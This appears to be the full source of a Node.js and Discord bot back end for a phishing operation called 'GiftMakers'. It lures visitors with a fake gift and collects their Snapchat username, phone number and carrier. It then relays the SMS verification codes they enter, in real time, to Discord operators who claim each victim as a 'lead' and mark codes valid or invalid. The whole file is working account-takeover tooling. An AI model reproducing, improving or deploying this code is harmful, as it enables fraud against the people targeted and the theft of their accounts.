const express = require('express');
const path = require('path');
const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle
} = require('discord.js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

const activeLeads = {};

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

client.once('ready', () => {
  console.log(`[Bot Discord] Connecté avec succès sous l'identifiant : ${client.user.tag}`);
});

function createLeadNotificationPanel(lead, uuid) {
  const embed = new EmbedBuilder()
    .setColor(0x1E3A8A)
    .setTitle('🎁 GIFTMAKERS — NOUVELLE DEMANDE')
    .setDescription(
      `👑 **Cadeau :** \`${lead.gift || 'Cadeau'}\` (\`${lead.option || 'N/A'}\`)\n` +
      `👤 **Compte / Cible :** \`${lead.snapUser}\`\n` +
      `📱 **Téléphone :** \`${lead.phone}\`\n` +
      `📡 **Opérateur :** \`${lead.operator}\`\n\n` +
      `🔑 **ID Session :** \`${uuid}\` • *Statut : En attente*`
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`claim_4digits_${uuid}`)
      .setLabel('Réclamer le lead')
      .setStyle(ButtonStyle.Primary)
  );

  return { embeds: [embed], components: [row] };
}

function createCodeReceivedPanel(lead, uuid, code) {
  const embed = new EmbedBuilder()
    .setColor(0x2563EB)
    .setTitle('📩 GIFTMAKERS — CODE SMS REÇU')
    .setDescription(
      `👑 **Cadeau :** \`${lead.gift || 'Cadeau'}\` (\`${lead.option || 'N/A'}\`)\n` +
      `📱 **Numéro :** \`${lead.phone}\`\n` +
      `🔢 **Code SMS :** \`\`\`${code}\`\`\`\n\n` +
      `⚡ *Action requise : Vérifiez et validez le code ci-dessous.*`
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`validate_${uuid}`)
      .setLabel('Valider')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`badcode_${uuid}`)
      .setLabel('Invalide')
      .setStyle(ButtonStyle.Danger)
  );

  return { embeds: [embed], components: [row] };
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId.startsWith('claim_4digits_')) {
    const uuidVal = interaction.customId.replace('claim_4digits_', '');
    const lead = activeLeads[uuidVal];

    if (!lead) {
      return interaction.reply({ content: `❌ Ce lead n'existe plus ou a expiré.`, ephemeral: true });
    }

    if (lead.claimedBy) {
      return interaction.reply({ content: `⚠️ **Ce lead a déjà été réclamé** par **${lead.claimedBy.username}** !`, ephemeral: true });
    }

    lead.status = 'request_code';
    lead.claimedBy = interaction.user;

    const updatedEmbed = new EmbedBuilder()
      .setColor(0x10B981)
      .setTitle('🎁 GIFTMAKERS — LEAD PRIS EN CHARGE')
      .setDescription(
        `👑 **Cadeau :** \`${lead.gift || 'Cadeau'}\` (\`${lead.option || 'N/A'}\`)\n` +
        `👤 **Compte / Cible :** \`${lead.snapUser}\`\n` +
        `📱 **Téléphone :** \`${lead.phone}\`\n` +
        `📡 **Opérateur :** \`${lead.operator}\`\n\n` +
        `🔒 **Pris par :** ${interaction.user} • \`ID: ${uuidVal}\``
      );

    const disabledRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`claimed_done_${uuidVal}`)
        .setLabel(`Réclamé par ${interaction.user.username}`)
        .setStyle(ButtonStyle.Secondary)
        .setDisabled(true)
    );

    await interaction.update({ embeds: [updatedEmbed], components: [disabledRow] });
    await interaction.followUp({ content: `✅ Vous avez réclamé ce lead !`, ephemeral: true });
  }

  if (interaction.customId.startsWith('validate_')) {
    const uuidVal = interaction.customId.replace('validate_', '');
    if (activeLeads[uuidVal]) activeLeads[uuidVal].status = 'success';
    await interaction.update({ content: '✨ **Succès** : Code validé et transmis au visiteur.', components: [] });
  }

  if (interaction.customId.startsWith('badcode_')) {
    const uuidVal = interaction.customId.replace('badcode_', '');
    if (activeLeads[uuidVal]) activeLeads[uuidVal].status = 'bad_code';
    await interaction.update({ content: '⚠️ **Alerte** : Code signalé comme incorrect.', components: [] });
  }
});

if (DISCORD_TOKEN) {
  client.login(DISCORD_TOKEN).catch(err => console.error('[Bot Discord] Erreur de connexion:', err));
} else {
  console.log('[Bot Discord] Avertissement : DISCORD_TOKEN manquant dans les variables d\'environnement.');
}

app.post('/api/lead', async (req, res) => {
  const { uuid, phone, snapUser, operator, gift, option } = req.body;
  activeLeads[uuid] = { status: 'pending', phone, snapUser, operator, gift, option, claimedBy: null };

  try {
    if (CHANNEL_ID) {
      const channel = await client.channels.fetch(CHANNEL_ID);
      if (channel) {
        await channel.send(createLeadNotificationPanel(activeLeads[uuid], uuid));
      }
    }
  } catch (e) {
    console.error(`[Bot Discord] Erreur d'envoi salon:`, e);
  }

  res.json({ success: true, uuid });
});

app.post('/api/submit-code', async (req, res) => {
  const { uuid, code } = req.body;
  const lead = activeLeads[uuid];

  if (lead && lead.claimedBy) {
    lead.code = code;
    lead.status = 'code_received';
    try {
      await lead.claimedBy.send(createCodeReceivedPanel(lead, uuid, code));
    } catch (e) {
      console.error('[Bot Discord] Impossible d\'envoyer le DM:', e);
    }
  }

  res.json({ success: true });
});

app.get('/api/lead-status/:uuid', (req, res) => {
  const lead = activeLeads[req.params.uuid];
  res.json(lead || { status: 'pending' });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n[GiftMakers] Serveur Web + Bot Discord en ligne sur le port ${PORT}`);
});
